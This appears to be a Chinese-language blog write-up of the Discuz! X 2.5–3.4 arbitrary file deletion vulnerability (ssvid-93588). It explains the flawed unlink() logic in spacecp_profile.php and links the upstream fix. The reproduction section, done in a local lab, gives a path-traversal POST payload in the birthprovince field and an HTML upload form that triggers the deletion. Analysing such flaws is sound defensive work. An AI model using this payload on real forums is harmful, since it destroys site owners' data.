---
title: Discuz2.5-3.4任意文件操作漏洞
subtitle: ssvid-93588
summary: 该漏洞通过配置属性值，通过模拟文件上传可以进入其他 unlink 条件，实现任意文件删除
authors:
- admin
tags: ["SSV","Discuz","任意文件操作"]
categories: ["Hack"]
date: "2017-09-29T00:00:00Z"
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
image:
  caption: ""
  focal_point: ""
projects: []
---

## 简介

Discuz!X社区软件，是一个采用 PHP 和 MySQL 等其他多种数据库构建的性能优异、功能全面、安全稳定的社区论坛平台。

2017年9月29日，Discuz!修复了一个安全问题用于加强安全性，这个漏洞会导致前台用户可以任意删除文件。

该漏洞于2014年6月被提交到 Wooyun漏洞平台，Seebug漏洞平台收录了该漏洞，漏洞编号 ssvid-93588。该漏洞通过配置属性值，导致任意文件删除。经过分析确认，原有的利用方式已经被修复，添加了对属性的 formtype 判断，但修复方式不完全导致可以绕过，通过模拟文件上传可以进入其他 unlink 条件，实现任意文件删除漏洞。

- 影响版本： 2.5-3.4
- 修复方案:

https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574

删除unlink相关代码。

## 原理

核心问题在 ==upload/source/include/spacecp/spacecp_profile.php==

跟入代码70行,当提交 ==profilesubmit== 时进入判断，跟入177行

我们发现如果满足配置文件中某个==formtype==的类型为 ==file==，我们就可以进入判断逻辑，我们接着看这次修复的改动，可以发现228行再次引入语句 ==unlink==

当上传文件并上传成功，即可进入 unlink 语句

然后回溯变量==$space[$key]==,不难发现这就是用户的个人设置。

只要找到一个可以控制的变量即可，这里选择了 ==birthprovince。==

在设置页面直接提交就可以绕过字段内容的限制了。

成功实现了任意文件删除

## 复现

环境：win7+phpstudy+discuz3.2

新建importantfile.txt作为测试

进入设置-个人资料，先在页面源代码找到formhash值


```
http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&ac=profile
```
![](http://image.3001.net/images/20171005/15072139595386.png)

![](http://image.3001.net/images/20171005/15072139935642.png)

可以看到formhash值是b21b6577。

再访问
```
10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&ac=profile&op=base
```
Post数据：
```
birthprovince=../../../importantfile.txt&profilesubmit=1&formhash=b21b6577
```


如图

![](http://image.3001.net/images/20171005/15072146208123.png)

执行后

![](http://image.3001.net/images/20171005/15072140283751.png)

出生地被修改成要删除的文件。

最后构造表单执行删除文件


```
<form action=”http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&ac=profile&op=base” method=”POST” enctype=”multipart/form-data”>

<input type=”file” name=”birthprovince” id=”file” />

<input type=”text” name=”formhash” value=”b21b6577″/></p>

<input type=”text” name=”profilesubmit” value=”1″/></p>

<input type=”submit” value=”Submit” />

</from>
```


随便上传一张图片，即可删除importantfile.txt

![](http://image.3001.net/images/20171005/15072140588158.png)

成功删除importantfile.txt

## 修复

Discuz!X 的码云已经更新修复了该漏洞

<https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574>